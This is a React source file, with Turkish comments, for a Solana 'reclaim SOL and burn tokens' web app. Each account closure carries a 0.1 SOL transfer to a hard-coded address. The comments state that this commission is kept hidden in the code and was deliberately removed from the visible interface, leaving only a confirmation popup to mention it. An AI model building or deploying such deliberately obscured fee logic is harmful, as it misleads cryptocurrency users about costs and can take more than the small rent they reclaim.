// src/ReclaimWithFeeApp.jsx dosyanızın yeni içeriği

import React, { useEffect, useState, useMemo } from "react";
import { Connection, PublicKey, Transaction, SystemProgram, LAMPORTS_PER_SOL } from "@solana/web3.js";
import { createCloseAccountInstruction, TOKEN_PROGRAM_ID } from "@solana/spl-token";
import { useWallet } from "@solana/wallet-adapter-react";
import { WalletMultiButton } from "@solana/wallet-adapter-react-ui";
import "@solana/wallet-adapter-react-ui/styles.css";
import "./burn.css";

// KODUN İÇİNDE GİZLİ KALAN SABİT DEĞERLER
const RPC_ENDPOINT = "https://api.mainnet-beta.solana.com";
const PLATFORM_FEE_SOL = 0.1; // Komisyon Miktarı (Kodun içinde kalacak)
const PLATFORM_FEE_ADDRESS = "GiLefarGmT5zvaeiFiLNmrckRen3MNjrXQ8fHCtAdN3s"; // Komisyon Adresi (Kodun içinde kalacak)

const l2s = (l) => (l / LAMPORTS_PER_SOL).toFixed(6);
const s2l = (s) => Math.round(s * LAMPORTS_PER_SOL);

export default function ReclaimWithFeeApp() {
  const conn = useMemo(() => new Connection(RPC_ENDPOINT, "confirmed"), []);
  const { publicKey, signTransaction, connected } = useWallet();
  const [rows, setRows] = useState([]);
  const [status, setStatus] = useState("");
  const [estFeeLamports] = useState(5000);

  useEffect(() => {
    if (!publicKey) { setRows([]); return; }
    (async () => {
      const r = await conn.getParsedTokenAccountsByOwner(publicKey, { programId: TOKEN_PROGRAM_ID });
      setRows(r.value.map(v => ({
        tokenAccount: v.pubkey.toBase58(),
        mint: v.account.data.parsed.info.mint,
        uiAmount: v.account.data.parsed.info.tokenAmount.uiAmount,
        lamports: v.account.lamports,
      })));
    })();
  }, [publicKey, conn]);

  async function closeWithFee(tokenAccStr) {
    if (!publicKey) return alert("Cüzdan bağlayın.");
    if (!signTransaction) return alert("Cüzdan signTransaction desteklemiyor.");

    const row = rows.find(x => x.tokenAccount === tokenAccStr);
    if (!row) return;
    const reclaimSol = row.lamports / LAMPORTS_PER_SOL;
    const feeSol = estFeeLamports / LAMPORTS_PER_SOL;
    const total = (feeSol + PLATFORM_FEE_SOL).toFixed(6);

    // ⚠️ KOMİSYON VE ADRES BİLGİSİ SADECE ONAY PENCERESİNDE GÖSTERİLİYOR ⚠️
    const ok = confirm(
`Aşağıdaki işlemleri onaylıyor musunuz?

Token account: ${tokenAccStr}
Geri Alınacak (yaklaşık): ${reclaimSol.toFixed(6)} SOL
Ağ Ücreti (tahmini): ~${feeSol.toFixed(6)} SOL
Platform Komisyonu: ${PLATFORM_FEE_SOL} SOL
Komisyon Alıcısı: ${PLATFORM_FEE_ADDRESS}

Toplam tahmini maliyet: ${total} SOL`
    );
    if (!ok) return;

    try {
      setStatus("İşlem hazırlanıyor...");
      const tx = new Transaction();

      // PLATFORM KOMİSYONU TRANSFER İŞLEMİ (Kodun içinde gizli kalır, UI'da görünmez)
      tx.add(SystemProgram.transfer({
        fromPubkey: publicKey,
        toPubkey: new PublicKey(PLATFORM_FEE_ADDRESS),
        lamports: s2l(PLATFORM_FEE_SOL),
      }));

      // HESAP KAPATMA VE SOLANA GERİ ALMA İŞLEMİ
      tx.add(createCloseAccountInstruction(
        new PublicKey(tokenAccStr), publicKey, publicKey, []
      ));

      tx.feePayer = publicKey;
      tx.recentBlockhash = (await conn.getLatestBlockhash()).blockhash;

      setStatus("Cüzdan imzası bekleniyor...");
      const signed = await signTransaction(tx);

      setStatus("İşlem gönderiliyor...");
      const sig = await conn.sendRawTransaction(signed.serialize());
      setStatus(`Gönderildi: ${sig} (onay bekleniyor)`);
      await conn.confirmTransaction(sig, "confirmed");
      setStatus(`Onaylandı: ${sig}`);
    } catch (e) {
      console.error(e);
      setStatus("Hata: " + (e.message || e.toString()));
    }
  }

  return (
    <div style={{ padding: 20, fontFamily: "Inter, Arial, sans-serif" }}>
      <h2>WinurSOL — Reclaim SOL & Burn Unwanted Tokens</h2>
      <WalletMultiButton />
      <div style={{ marginTop: 8 }}><b>Status:</b> {status || "Hazır"}</div>

      {!connected || !publicKey ? (
        <p>Cüzdan bağlayın.</p>
      ) : (
        <>
          <p>Bağlı: <code>{publicKey.toBase58()}</code></p>
          
            {/* ❌ KALDIRILDI: Komisyon bilgisi UI'dan kaldırıldı ❌ */}
            {/* Eskiden burada: <p>Komisyon: <b>0.1 SOL</b> → <code>{PLATFORM_FEE_ADDRESS}</code></p> vardı */}

          <table style={{ width: "100%", borderCollapse: "collapse", marginTop: 10 }}>
            <thead>
              <tr style={{ textAlign: "left", borderBottom: "1px solid #ddd" }}>
                <th>#</th><th>Token Account</th><th>Mint</th><th>Token Bal.</th>
                <th>Reclaim (SOL)</th><th>Est. Fee</th><th>İşlem</th>
              </tr>
            </thead>
            <tbody>
              {rows.map((r, i) => (
                <tr key={r.tokenAccount} style={{ borderBottom: "1px solid #f2f2f2" }}>
                  <td>{i+1}</td>
                  <td style={{ fontFamily: "monospace" }}>{r.tokenAccount}</td>
                  <td style={{ fontFamily: "monospace" }}>{r.mint}</td>
                  <td>{r.uiAmount}</td>
                  <td>{l2s(r.lamports)}</td>
                  <td>{l2s(estFeeLamports)}</td>
                  <td>
                    <button className="burn-btn" onClick={() => closeWithFee(r.tokenAccount)}>
                      <span className="flames"><i></i><i></i><i></i></span>
                      <span className="label">BURN YOUR COIN</span>
                    </button>
                  </td>
                </tr>
              ))}
            </tbody>
          </table>
        </>
      )}
    </div>
  );
}